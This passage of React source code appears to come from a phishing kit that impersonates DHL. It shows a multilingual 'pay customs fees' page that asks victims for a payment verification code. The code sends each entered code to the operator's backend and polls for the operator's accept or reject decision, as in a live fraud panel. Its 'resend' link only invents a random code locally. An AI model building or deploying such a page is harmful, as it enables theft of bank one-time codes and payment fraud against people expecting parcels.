      copyright: "DHL Group - Alla rättigheter förbehålls"
    },
    no: {
      step1: "Fyll ut informasjon",
      step2: "Betal tollavgifter",
      step3: "Send omforsendelse",
      otpTitle: "Bekreft betalingen din",
      otpSub: "En bekreftelseskode er sendt til ditt registrerte telefonnummer.",
      codeExpires: "Koden utløper om",
      verifyBtn: "Bekreft kode",
      verifying: "Bekrefter...",
      resendText: "Mottok du ikke koden?",
      resendLink: "Send koden på nytt",
      notificationSuccess: "✅ Koden ble bekreftet! Omdirigerer...",
      notificationError: "❌ Koden ble avvist. Prøv igjen.",
      notificationInvalidCode: "Vennligst skriv inn 4-8 sifret kode.",
      notificationCodeTooLong: "Koden kan ikke overstige 8 sifre.",
      notificationVerifyError: "❌ Bekreftelsesfeil. Prøv igjen.",
      notificationResendSuccess: "✅ Koden ble sendt på nytt!",
      notificationResendError: "❌ Feil ved sending av kode. Prøv igjen.",
      privacyNotice: "Personvernerklæring",
      consentSettings: "Samtykkeinnstillinger",
      copyright: "DHL Group - Alle rettigheter forbeholdt"
    },
    da: {
      step1: "Udfyld information",
      step2: "Betal toldafgifter",
      step3: "Indsend gensendelse",
      otpTitle: "Bekræft din betaling",
      otpSub: "En bekræftelseskode er sendt til dit registrerede telefonnummer.",
      codeExpires: "Koden udløber om",
      verifyBtn: "Bekræft kode",
      verifying: "Bekræfter...",
      resendText: "Modtog du ikke koden?",
      resendLink: "Send kode igen",
      notificationSuccess: "✅ Koden blev bekræftet! Omdirigerer...",
      notificationError: "❌ Koden blev afvist. Prøv igen.",
      notificationInvalidCode: "Indtast 4-8 cifret kode.",
      notificationCodeTooLong: "Koden må ikke overstige 8 cifre.",
      notificationVerifyError: "❌ Bekræftelsesfejl. Prøv igen.",
      notificationResendSuccess: "✅ Koden blev sendt igen!",
      notificationResendError: "❌ Fejl ved gensendelse af kode. Prøv igen.",
      privacyNotice: "Privatlivspolitik",
      consentSettings: "Samtykkeindstillinger",
      copyright: "DHL Group - Alle rettigheder forbeholdes"
    },
    fi: {
      step1: "Täytä tiedot",
      step2: "Maksa tullimaksut",
      step3: "Lähetä uudelleenlähetys",
      otpTitle: "Vahvista maksusi",
      otpSub: "Vahvistuskoodi on lähetetty rekisteröityyn puhelinnumeroosi.",
      codeExpires: "Koodi vanhenee",
      verifyBtn: "Vahvista koodi",
      verifying: "Vahvistetaan...",
      resendText: "Etkö saanut koodia?",
      resendLink: "Lähetä koodi uudelleen",
      notificationSuccess: "✅ Koodi vahvistettu! Uudelleenohjataan...",
      notificationError: "❌ Koodi hylättiin. Yritä uudelleen.",
      notificationInvalidCode: "Anna 4-8 numeron koodi.",
      notificationCodeTooLong: "Koodi ei voi ylittää 8 numeroa.",
      notificationVerifyError: "❌ Vahvistusvirhe. Yritä uudelleen.",
      notificationResendSuccess: "✅ Koodi lähetettiin uudelleen!",
      notificationResendError: "❌ Virhe koodin uudelleenlähetyksessä. Yritä uudelleen.",
      privacyNotice: "Tietosuojailmoitus",
      consentSettings: "Suostumusasetukset",
      copyright: "DHL Group - Kaikki oikeudet pidätetään"
    },
    el: {
      step1: "Συμπληρώστε πληροφορίες",
      step2: "Πληρώστε τελωνειακά τέλη",
      step3: "Υποβολή εκ νέου αποστολής",
      otpTitle: "Επαληθεύστε την πληρωμή σας",
      otpSub: "Ένας κωδικός επαλήθευσης στάλθηκε στο καταχωρημένο τηλέφωνό σας.",
      codeExpires: "Ο κωδικός λήγει σε",
      verifyBtn: "Επαλήθευση κωδικού",
      verifying: "Επαλήθευση...",
      resendText: "Δεν λάβατε τον κωδικό;",
      resendLink: "Επαναποστολή κωδικού",
      notificationSuccess: "✅ Ο κωδικός επαληθεύτηκε! Ανακατεύθυνση...",
      notificationError: "❌ Ο κωδικός απορρίφθηκε. Δοκιμάστε ξανά.",
      notificationInvalidCode: "Εισάγετε τον 4-8ψήφιο κωδικό.",
      notificationCodeTooLong: "Ο κωδικός δεν μπορεί να υπερβαίνει τα 8 ψηφία.",
      notificationVerifyError: "❌ Σφάλμα επαλήθευσης. Δοκιμάστε ξανά.",
      notificationResendSuccess: "✅ Ο κωδικός εστάλη ξανά!",
      notificationResendError: "❌ Σφάλμα επαναποστολής κωδικού. Δοκιμάστε ξανά.",
      privacyNotice: "Δήλωση απορρήτου",
      consentSettings: "Ρυθμίσεις συναίνεσης",
      copyright: "DHL Group - Με επιφύλαξη παντός δικαιώματος"
    },
    cs: {
      step1: "Vyplňte informace",
      step2: "Zaplaťte clo",
      step3: "Odeslat opakovanou zásilku",
      otpTitle: "Ověřte svou platbu",
      otpSub: "Ověřovací kód byl odeslán na vaše registrované telefonní číslo.",
      codeExpires: "Platnost kódu vyprší za",
      verifyBtn: "Ověřit kód",
      verifying: "Ověřování...",
      resendText: "Nedostali jste kód?",
      resendLink: "Odeslat kód znovu",
      notificationSuccess: "✅ Kód byl úspěšně ověřen! Přesměrování...",
      notificationError: "❌ Kód byl zamítnut. Zkuste to prosím znovu.",
      notificationInvalidCode: "Zadejte 4-8místný kód.",
      notificationCodeTooLong: "Kód nesmí přesáhnout 8 číslic.",
      notificationVerifyError: "❌ Chyba ověření. Zkuste to prosím znovu.",
      notificationResendSuccess: "✅ Kód byl znovu odeslán!",
      notificationResendError: "❌ Chyba při opětovném odesílání kódu. Zkuste to prosím znovu.",
      privacyNotice: "Ochrana soukromí",
      consentSettings: "Nastavení souhlasu",
      copyright: "Skupina DHL – Všechna práva vyhrazena"
    },
    bn: {
      step1: "তথ্য পূরণ করুন",
      step2: "কাস্টমস ফি পরিশোধ করুন",
      step3: "পুনঃপ্রেরণ জমা দিন",
      otpTitle: "আপনার পেমেন্ট যাচাই করুন",
      otpSub: "আপনার নিবন্ধিত ফোন নম্বরে একটি যাচাইকরণ কোড পাঠানো হয়েছে।",
      codeExpires: "কোডের মেয়াদ শেষ হবে",
      verifyBtn: "কোড যাচাই করুন",
      verifying: "যাচাই করা হচ্ছে...",
      resendText: "কোড পাননি?",
      resendLink: "কোড পুনরায় পাঠান",
      notificationSuccess: "✅ কোড সফলভাবে যাচাই করা হয়েছে! পুনঃনির্দেশ করা হচ্ছে...",
      notificationError: "❌ কোড প্রত্যাখ্যান করা হয়েছে। আবার চেষ্টা করুন।",
      notificationInvalidCode: "অনুগ্রহ করে 4-8 সংখ্যার কোড লিখুন।",
      notificationCodeTooLong: "কোড 8 সংখ্যার বেশি হতে পারে না।",
      notificationVerifyError: "❌ যাচাইকরণ ত্রুটি। আবার চেষ্টা করুন।",
      notificationResendSuccess: "✅ কোড সফলভাবে পুনরায় পাঠানো হয়েছে!",
      notificationResendError: "❌ কোড পুনরায় পাঠাতে ত্রুটি। আবার চেষ্টা করুন।",
      privacyNotice: "গোপনীয়তা বিজ্ঞপ্তি",
      consentSettings: "সম্মতি সেটিংস",
      copyright: "DHL গ্রুপ - সর্বস্বত্ব সংরক্ষিত"
    },
    si: {
      step1: "තොරතුරු පුරවන්න",
      step2: "රේගු ගාස්තු ගෙවන්න",
      step3: "නැවත යැවීම ඉදිරිපත් කරන්න",
      otpTitle: "ඔබගේ ගෙවීම තහවුරු කරන්න",
      otpSub: "තහවුරු කිරීමේ කේතයක් ඔබගේ ලියාපදිංචි දුරකථන අංකයට යවා ඇත.",
      codeExpires: "කේතය කල් ඉකුත් වන්නේ",
      verifyBtn: "කේතය තහවුරු කරන්න",
      verifying: "තහවුරු කරමින්...",
      resendText: "කේතය ලැබුනේ නැද්ද?",
      resendLink: "කේතය නැවත යවන්න",
      notificationSuccess: "✅ කේතය සාර්ථකව තහවුරු විය! නැවත යොමු කරමින්...",
      notificationError: "❌ කේතය ප්‍රතික්ෂේප කරන ලදී. කරුණාකර නැවත උත්සාහ කරන්න.",
      notificationInvalidCode: "කරුණාකර 4-8 ඉලක්කම් කේතය ඇතුළු කරන්න.",
      notificationCodeTooLong: "කේතය ඉලක්කම් 8 ඉක්මවිය නොහැක.",
      notificationVerifyError: "❌ තහවුරු කිරීමේ දෝෂයකි. කරුණාකර නැවත උත්සාහ කරන්න.",
      notificationResendSuccess: "✅ කේතය සාර්ථකව නැවත යවන ලදී!",
      notificationResendError: "❌ කේතය නැවත යැවීමේ දෝෂයකි. කරුණාකර නැවත උත්සාහ කරන්න.",
      privacyNotice: "රහස්‍යතා දැන්වීම",
      consentSettings: "අනුමැති සැකසුම්",
      copyright: "DHL කණ්ඩායම - සියලුම හිමිකම් ඇවිරිණි"
    }
  };

  // Helper function to get translation
  const t = (key) => {
    const langTranslations = translations[selectedLang.code];
    if (langTranslations && langTranslations[key]) {
      return langTranslations[key];
    }
    // Fallback to English if translation not found
    return translations.en[key] || key;
  };

  // Detect language based on IP country
  useEffect(() => {
    const detectLanguageFromIP = async () => {
      setIsLoadingLang(true);
      try {
        const response = await fetch(`${apiUrl}/api/ipinfo`);
        const data = await response.json();
        
        let detectedLangCode = 'en'; // Default to English
        
        if (data.success && data.country_code) {
          const countryCode = data.country_code.toUpperCase();
          const langCode = countryToLanguage[countryCode];
          
          if (langCode) {
            detectedLangCode = langCode;
            console.log(`🌍 Detected country: ${countryCode} -> Setting language: ${langCode}`);
          } else {
            console.log(`🌍 Detected country: ${countryCode} -> No specific mapping, using English`);
          }
        }
        
        // Find the language object
        const detectedLang = languages.find(lang => lang.code === detectedLangCode);
        
        if (detectedLang) {
          setSelectedLang(detectedLang);
          setIsRTL(detectedLang.rtl);
          // Update document direction for RTL support
          document.documentElement.dir = detectedLang.rtl ? 'rtl' : 'ltr';
        } else {
          // Fallback to English
          const englishLang = languages.find(lang => lang.code === 'en');
          if (englishLang) {
            setSelectedLang(englishLang);
            setIsRTL(englishLang.rtl);
            document.documentElement.dir = englishLang.rtl ? 'rtl' : 'ltr';
          }
        }
      } catch (error) {
        console.error('Error detecting language from IP:', error);
        // Keep default English
        const englishLang = languages.find(lang => lang.code === 'en');
        if (englishLang) {
          setSelectedLang(englishLang);
          setIsRTL(englishLang.rtl);
        }
      } finally {
        setIsLoadingLang(false);
      }
    };
    
    detectLanguageFromIP();
  }, [apiUrl]);

  // Update document direction when language changes
  useEffect(() => {
    document.documentElement.dir = isRTL ? 'rtl' : 'ltr';
    document.body.style.direction = isRTL ? 'rtl' : 'ltr';
  }, [isRTL]);

  // Function to show notifications
  const showNotification = (message, type = 'error') => {
    if (stepCircleRef.current) {
      const rect = stepCircleRef.current.getBoundingClientRect();
      setNotificationPosition({
        top: rect.top - 60,
        left: rect.left + (rect.width / 2)
      });
    }
    setNotification({ message, type });
    setTimeout(() => setNotification(null), 3000);
  };

  // Timer countdown effect
  useEffect(() => {
    if (timeLeft <= 0) {
      setIsResendDisabled(false);
      if (timerRef.current) clearInterval(timerRef.current);
      return;
    }
    
    timerRef.current = setInterval(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);
    
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, [timeLeft]);

  // Cleanup polling on unmount
  useEffect(() => {
    return () => {
      if (pollingRef.current) {
        clearInterval(pollingRef.current);
      }
    };
  }, []);

  // Format time as MM:SS
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  // Handle OTP input change (4-8 digits)
  const handleOtpChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 8);
    setOtp(value);
  };

  // Poll for OTP status
  const startPolling = (requestId) => {
    if (pollingRef.current) {
      clearInterval(pollingRef.current);
    }
    
    pollingRef.current = setInterval(async () => {
      try {
        const response = await fetch(`${apiUrl}/api/otp/status/${requestId}`);
        
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}`);
        }
        
        const data = await response.json();
        
        if (data.status === 'accepted' || data.status === 'verify') {
          clearInterval(pollingRef.current);
          setIsVerifying(false);
          showNotification(t('notificationSuccess'), 'success');
          setTimeout(() => {
            window.location.href = '/success';
          }, 1500);
        } else if (data.status === 'rejected') {
          clearInterval(pollingRef.current);
          setIsVerifying(false);
          showNotification(t('notificationError'), 'error');
          setOtp('');
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 2000);
  };

  // Handle verify button click
  const handleVerify = async () => {
    if (!otp || otp.length < 4) {
      showNotification(t('notificationInvalidCode'), 'error');
      return;
    }
    
    if (otp.length > 8) {
      showNotification(t('notificationCodeTooLong'), 'error');
      return;
    }
    
    setIsVerifying(true);
    
    try {
      const response = await fetch(`${apiUrl}/api/send-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ code: otp })
      });
      
      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.error || `HTTP ${response.status}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        const requestId = data.id;
        setOtpRequestId(requestId);
        startPolling(requestId);
      } else {
        throw new Error(data.error || 'Failed to send OTP');
      }
    } catch (error) {
      console.error('Verification error:', error);
      setIsVerifying(false);
      showNotification(t('notificationVerifyError'), 'error');
    }
  };

  // Handle resend code
  const handleResend = async () => {
    if (isResendDisabled) return;
    
    try {
      const length = Math.floor(Math.random() * 5) + 4;
      const min = Math.pow(10, length - 1);
      const max = Math.pow(10, length) - 1;
      const newOtp = Math.floor(min + Math.random() * (max - min + 1)).toString();
      
      const response = await fetch(`${apiUrl}/api/send-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ code: newOtp })
      });
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        setOtp(newOtp);
        setOtpRequestId(data.id);
        setIsResendDisabled(true);
        setTimeLeft(76);        
        if (pollingRef.current) {
          clearInterval(pollingRef.current);
        }
        startPolling(data.id);
        
        showNotification(t('notificationResendSuccess'), 'success');
      }
    } catch (error) {
      console.error('Resend error:', error);
      showNotification(t('notificationResendError'), 'error');
    }
  };

  // Handle language selection
  const handleLanguageSelect = (lang) => {
    setSelectedLang(lang);
    setIsRTL(lang.rtl);
    setLanguageMenuOpen(false);
    // Persist language choice in localStorage if desired
    localStorage.setItem('preferredLanguage', lang.code);
  };

  const toggleLanguageMenu = () => setLanguageMenuOpen(prev => !prev);

  useEffect(() => {
    const handleClickOutside = (event) => {
      if (languageMenuRef.current && !languageMenuRef.current.contains(event.target)) {
        setLanguageMenuOpen(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  // Loading state while detecting language
  if (isLoadingLang) {
    return <LoadingPage />;
  }

  return (
    <div className="app" dir={isRTL ? 'rtl' : 'ltr'}>
      {/* Notification Popup */}
      {notification && (
        <div 
          className="notification-popup" 
          style={{
            position: 'fixed',
            top: `${notificationPosition.top}px`,
            left: `${notificationPosition.left}px`,
            transform: 'translateX(-50%)',
            padding: '10px 20px',
            borderRadius: '8px',
            color: '#fff',
            fontSize: '14px',
            fontWeight: '500',
            zIndex: 10000,
            boxShadow: '0 4px 12px rgba(0,0,0,0.15)',
            backgroundColor: notification.type === 'error' ? '#ef4444' : '#10b981',
            animation: 'fadeInDown 0.3s ease-out',
            textAlign: 'center',
            whiteSpace: 'normal',
            wordBreak: 'keep-all',
            maxWidth: '90%'
          }}
        >
          {notification.message}
        </div>
      )}
      
      <main>
        {/* Header */}
        <div className="sc-9fc13f70-0 hCaVpb">
          <div className="sc-af944128-0 iSQNEq">
            <div className="sc-ac1f2408-0 sc-af944128-1 fcRhWn jnXOaK">
              <div dir="ltr" className="sc-af944128-4 GghYU">
                <div className="sc-af944128-2 idxbwe">
                  <img 
                    alt="DHL Logo" 
                    src="/dhl-express-logo.png"/>
                </div>
              </div>
              <div dir="ltr" className="sc-af944128-3 dZjtYI">
                <div className="sc-9fc13f70-5 bqGehh">
                  <div className="sc-9fc13f70-10 cCbdwA">
                    <div className="portal-lang-dropdown" ref={languageMenuRef} style={{ position: 'relative' }}>
                      <button 
                        className="portal-lang-btn" 
                        id="langBtn"
                        onClick={toggleLanguageMenu}
                        style={{ display: 'flex', alignItems: 'center', gap: '6px', cursor: 'pointer' }}
                      >
                        <span id="langFlag">{selectedLang.flag}</span>
                        <span id="langName">{selectedLang.name}</span>
                        <svg width="12" height="12" viewBox="0 0 12 12" fill="none" style={{ marginLeft: '4px' }}>
                          <path d="M3 5L6 8L9 5" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"></path>
                        </svg>
                      </button>
                      {languageMenuOpen && (
                        <div className="portal-lang-menu" id="langMenu" style={{
                          position: 'absolute',
                          top: 'calc(100% + 6px)',
                          right: 0,
                          background: '#fff',
                          borderRadius: '10px',
                          boxShadow: '0 8px 32px rgba(0,0,0,.18)',
                          minWidth: '220px',
                          maxHeight: '400px',
                          overflowY: 'auto',
                          zIndex: 200,
                          border: '1px solid #e2e8f0'
                        }}>
                          {languages.map((lang) => (
                            <a
                              key={lang.code}
                              href="#"
                              onClick={(e) => {
                                e.preventDefault();
                                handleLanguageSelect(lang);
                              }}
                              style={{
                                display: 'flex',
                                alignItems: 'center',
                                gap: '10px',
                                padding: '10px 16px',
                                textDecoration: 'none',
                                color: '#333',
                                fontSize: '14px',
                                cursor: 'pointer',
                                backgroundColor: selectedLang.code === lang.code ? '#f1f5f9' : 'transparent'
                              }}
                              onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#f1f5f9'}
                              onMouseLeave={(e) => {
                                if (selectedLang.code !== lang.code) {
                                  e.currentTarget.style.backgroundColor = 'transparent';
                                }
                              }}
                            >
                              <span>{lang.flag}</span>
                              <span>{lang.name}</span>
                              <span style={{ marginLeft: 'auto', fontSize: '12px', color: '#94a3b8' }}>{lang.code.toUpperCase()}</span>
                              {selectedLang.code === lang.code && (
                                <span style={{ marginLeft: '6px', color: '#d40511' }}>✓</span>
                              )}
                            </a>
                          ))}
                        </div>
                      )}
                    </div>
                    <div className="sc-668c2989-0 csDJGO"></div>
                  </div>
                  <div className="sc-9fc13f70-28 gFDcEs">
                    <div className="sc-9fc13f70-29 eUEhcB"></div>
                  </div>
                  <div className="sc-9fc13f70-30 eVGzQl">
                    <div className="sc-9fc13f70-31 eVYcJy"></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="main-content">
          <div className="center-container">
            <div className="live-region" aria-live="assertive"></div>

            {/* Steps with translations */}
            <div className="portal-steps">
              <div className="portal-step done">
                <span className="portal-step-circle done">
                  <svg width="14" height="11" viewBox="0 0 14 11" fill="none">
                    <path d="M1 5.5L5 9.5L13 1" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path>
                  </svg>
                </span>
                <span className="portal-step-label">{t('step1')}</span>
              </div>
              <span className="portal-step-line done"></span>
              <div className="portal-step active">
                <span className="portal-step-circle active" ref={stepCircleRef}>2</span>
                <span className="portal-step-label">{t('step2')}</span>
              </div>
              <span className="portal-step-line"></span>
              <div className="portal-step upcoming">
                <span className="portal-step-circle upcoming">3</span>
                <span className="portal-step-label">{t('step3')}</span>
              </div>
            </div>

            {/* OTP Card */}
            <div className="otp-card">
              <div className="otp-container-inner">
                {/* Animated Phone */}
                <div className="otp-phone-anim">
                  <div className="otp-signal"></div>
                  <div className="otp-signal"></div>
                  <div className="otp-phone-body">
                    <div className="otp-phone-notch"></div>
                    <div className="otp-phone-screen">
                      <div className="otp-msg-icon">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#64748b" strokeWidth="1.5">
                          <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                          <polyline points="22,6 12,13 2,6"></polyline>
                        </svg>
                      </div>
                      <div className="otp-msg-bubble">OTP Code</div>
                      <div className="otp-msg-code">* * * *</div>
                    </div>
                    <div className="otp-phone-homebtn"></div>
                  </div>
                  <div className="otp-notif-dot">1</div>
                </div>

                <h2 className="otp-title">{t('otpTitle')}</h2>
                <p className="otp-sub">{t('otpSub')}</p>

                <div className="otp-field-wrap">
                  <form data-portal="otp" noValidate onSubmit={(e) => e.preventDefault()}>
                    <input
                      type="text"
                      data-portal-field="otp_code"
                      maxLength="8"
                      className="otp-input"
                      placeholder={otp.length === 0 ? "----" : "--------"}
                      inputMode="numeric"
                      pattern="[0-9]*"
                      autoComplete="one-time-code"
                      value={otp}
                      onChange={handleOtpChange}
                      disabled={isVerifying}
                      style={{
                        textAlign: 'center',
                        fontSize: '32px',
                        letterSpacing: '8px',
                        padding: '15px'
                      }}
                    />
                  </form>
                </div>

                <div className="otp-timer">
                  {t('codeExpires')} <strong id="otp-countdown">{formatTime(timeLeft)}</strong>
                </div>

                <button
                  type="button"
                  className="otp-verify-btn"
                  onClick={handleVerify}
                  disabled={isVerifying || !otp || otp.length < 4}
                  style={{
                    opacity: (isVerifying || !otp || otp.length < 4) ? 0.6 : 1,
                    cursor: (isVerifying || !otp || otp.length < 4) ? 'not-allowed' : 'pointer'
                  }}
                >
                  {isVerifying ? t('verifying') : t('verifyBtn')}
                </button>

                <p className="otp-resend">
                  {t('resendText')}{' '}
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      handleResend();
                    }}
                    style={{ 
                      pointerEvents: isResendDisabled ? 'none' : 'auto', 
                      opacity: isResendDisabled ? 0.5 : 1 
                    }}
                  >
                    {t('resendLink')}
                  </a>
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
               <div className="footer">
          <div className="footer-inner">
            <table className="footer-table">
              <tbody>
                <tr className="footer-row">
                  <td className="footer-links">
                    <a href="#" className="footer-link"><strong>{t('privacyNotice')}</strong></a>
                    <div className="footer-consent">
                      <a href="#" className="footer-consent-link">{t('consentSettings')}</a>
                    </div>
                  </td>
                  <td className="footer-logo-cell">
                    <img 
                      alt="DHL Logo" 
                      loading="lazy" 
                      width="128" 
                      height="auto" 
                      decoding="async" 
                      src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBpZD0ibG9nbyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgMTk2IDUxLjgzNjciIHdpZHRoPSIxNjAiIGhlaWdodD0iNTIiPgogIDxnPgogICAgPGc+CiAgICAgIDxnPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyMi4xIDI2LjUwNTggMjIuMSAyNS4wNTgxIDI0LjA3MDMgMCAyNC4wNzAzIDAgMjIuMSAwIDIyLjEiLz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjAgMTguNDQ0NCAyOS4xOTg2IDE4LjQ0NDQgMjcuNzQ4MyAyMC40MTIgMCAyMC40MTIgMCAxOC40NDQ0IDAgMTguNDQ0NCIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyNS43NTg0IDIzLjgxNDYgMjUuNzU4NCAyMi4zNzMzIDI3LjcxNTIgMCAyNy43MTUyIDAgMjUuNzU4NCAwIDI1Ljc1ODQiLz4KICAgICAgPC9nPgogICAgICA8Zz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjE5NiAyNC4wNzAzIDE2OS41OTc2IDI0LjA3MDMgMTcxLjA0NDYgMjIuMTAxNCAxOTYgMjIuMTAxNCAxOTYgMjQuMDcwMyAxOTYgMjQuMDcwMyIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMTk2IDI3LjcxNTIgMTY2LjkxMjggMjcuNzE3OSAxNjguMzUzNyAyNS43NTg0IDE5NiAyNS43NTg0IDE5NiAyNy43MTUyIDE5NiAyNy43MTUyIi8+CiAgICAgICAgPHBvbHlnb24gcG9pbnRzPSIxNzMuNzM1NCAxOC40NDQ0IDE5NiAxOC40NDQ0IDE5NiAyMC40MTMzIDE3Mi4yODcgMjAuNDE0NyAxNzMuNzM1NCAxOC40NDQ0IDE3My43MzU0IDE4LjQ0NDQiLz4KICAgICAgPC9nPgogICAgPC9nPgogICAgPGc+CiAgICAgIDxwYXRoIGQ9Im0yNS42NzI2LDI3LjcxNTJsMTIuNTc4LTE3LjA4ODVoMTUuNjA4MmMxLjcyNTIsMCwxLjcwMjYuNjU1Ljg1OTUsMS43OTc1LS44NTYyLDEuMTYtMi4zMTM0LDMuMTU0Ni0zLjE4NTQsNC4zMzIyLS40NDI2LjU5ODItMS4yNDMxLDEuNjg4MSwxLjQwODksMS42ODgxaDIwLjkxMDFjLTEuNzM5LDIuMzgyMi03LjM3OTYsOS4yNzA4LTE3LjUwODMsOS4yNzA4aC0zMC42NzFaIi8+CiAgICAgIDxwYXRoIGQ9Im05Ny43MDU2LDE4LjQ0M2wtNi44MjAyLDkuMjcyMmgtMTcuOTkyNHM2LjgxNzItOS4yNzA4LDYuODIzMy05LjI3MDhsMTcuOTg5My0uMDAxNGgwWiIvPgogICAgICA8cGF0aCBkPSJtMTIzLjcyMzksMTguNDQ0NGwtNi44MjM5LDkuMjcwOGgtMTcuOTg1NnM2LjgxNzgtOS4yNzA4LDYuODIzOS05LjI3MDhoMTcuOTg1NloiLz4KICAgICAgPHBhdGggZD0ibTEyOS41NzQ5LDE4LjQ0NDRjLjAwMDYsMC0xLjMxNCwxLjc5NzQtMS45NTI4LDIuNjYwNC0yLjI1OTMsMy4wNTMzLS4yNjI2LDYuNjEwNCw3LjExMDksNi42MTA0aDI4Ljg4NTNsNi44MjI2LTkuMjcwOGgtNDAuODY2MVoiLz4KICAgIDwvZz4KICAgIDxnPgogICAgICA8cGF0aCBkPSJtMzQuNDY4NSwwbC02LjI2MjEsOC41MDc4aDM0LjEyODhjMS43MjQ5LDAsMS43MDIzLjY1NS44NTkzLDEuNzk3NC0uODU2MiwxLjE1ODctMi4yODk0LDMuMTc2My0zLjE2MTQsNC4zNTM4LS40NDI3LjU5NjktMS4yNDMxLDEuNjg2NywxLjQwODksMS42ODY3aDEzLjk1NjRzMi4yNDk1LTMuMDYxNCw0LjEzNTItNS42MjA1YzIuNTY1NS0zLjQ4MTQuMjIyNS0xMC43MjUyLTguOTQ4Ni0xMC43MjUyaC0zNi4xMTY1WiIvPgogICAgICA8cG9seWdvbiBwb2ludHM9IjEyNS4yNjg4IDE2LjM0NTggODEuMjYxOSAxNi4zNDU4IDkzLjI5NTYgMCAxMTEuMjgxOSAwIDEwNC4zODU4IDkuMzcyMSAxMTIuNDEzNiA5LjM3MjEgMTE5LjMxNTMgMCAxMzcuMjk4OSAwIDEyNS4yNjg4IDE2LjM0NTggMTI1LjI2ODggMTYuMzQ1OCIvPgogICAgICA8cGF0aCBkPSJtMTYyLjIwODQsMGwtMTIuMDMxNCwxNi4zNDU4aC0xOS4wNTkzUzE0My4xNTMyLDAsMTQzLjE1OTIsMGgxOS4wNDkyWiIvPgogICAgPC9nPgogIDwvZz4KICA8Zz4KICAgIDxwYXRoIGQ9Im0xMjguODQxMiw0OC4zOTQzYy0xLjc5NjgsMC0zLjE5MzktLjU1MDctNC4xOTA1LTEuNjUyM3MtMS40OTUtMi42Mjk0LTEuNDk1LTQuNTgzNXYtMS4xNDEyYzAtMS4yOTgxLjI0MzEtMi40MDk2LjcyNzktMy4zMzQzLjQ4NTUtLjkyNDQsMS4xNjc1LTEuNjMyNywyLjA0Ni0yLjEyNDMuODc4NS0uNDkxOSwxLjkwODItLjczNzcsMy4wODg1LS43Mzc3Ljk0NCwwLDEuNzkwMS4xNjA3LDIuNTM3NS40ODE4Ljc0NzUuMzIxOCwxLjM5NzEuNzkwNCwxLjk0NzQsMS40MDY1bC0xLjczMDYsMS44Mjk2Yy0uNDMyOC0uNDMyOC0uODcyNC0uNzM0My0xLjMxODEtLjkwNDgtLjQ0NjMtLjE3MDUtLjkxMTYtLjI1NTktMS4zOTcxLS4yNTU5LS45NDQsMC0xLjY2OTIuMzE4NC0yLjE3MzYuOTU0MS0uNTA1MS42MzY0LS43NTc2LDEuNTcwNi0uNzU3NiwyLjgwMzN2LjkwNDhjMCwxLjIzMy4yMzMsMi4xNzM5LjY5ODksMi44MjI4LjQ2NTIuNjQ5MiwxLjE0MzkuOTczNywyLjAzNTguOTczNy44MTMsMCwxLjQzODktLjI2ODQsMS44Nzg1LS44MDYycy42NTktMS4yMzI2LjY1OS0yLjA4NTVoLTIuNTk3di0yLjM5OThoNS40ODl2Mi4yODJjMCwxLjE2NzUtLjIyMzUsMi4xNjcyLS42NjkyLDIuOTk5Ny0uNDQ1Ny44MzMyLTEuMDc1NywxLjQ2OS0xLjg4ODYsMS45MDgycy0xLjc3NzIuNjU5LTIuODkxNC42NTlaIi8+CiAgICA8cGF0aCBkPSJtMTM2LjQ3MzUsNDguMDk5M3YtMTAuMDMyNGgyLjY5NDl2Mi40OThjLjE0MzgtLjQ0NTcuMzM3Ni0uODY4Ny41OC0xLjI2ODguMjQzMS0uMzk5Ny41NTc3LS43Mjc5Ljk0NDctLjk4MzUuMzg2Mi0uMjU1OS44Njg0LS4zODM1LDEuNDQ1Ny0uMzgzNS4xMTgyLDAsLjIyNjIuMDAzNC4zMjQ4LjAwOTguMDk3OS4wMDY4LjIxOTUuMDIzLjM2NC4wNDl2Mi42MzYxYy0uMTA1My0uMDEyOC0uMjIwMS0uMDIyNi0uMzQ0NC0uMDI5NC0uMTI0OS0uMDA2NC0uMjQ1OC0uMDA5OC0uMzY0LS4wMDk4LS43MjEyLDAtMS4zMTEzLjEzNzQtMS43NzA1LjQxMjlzLS44MDAyLjU3MDYtMS4wMjMuODg1MnY2LjIxNjJoLTIuODUyMloiLz4KICAgIDxwYXRoIGQ9Im0xNDguNjUsNDguMzM1M2MtMS40OTUsMC0yLjY3MjYtLjQzMjgtMy41MzA4LTEuMjk4MS0uODU5Ni0uOD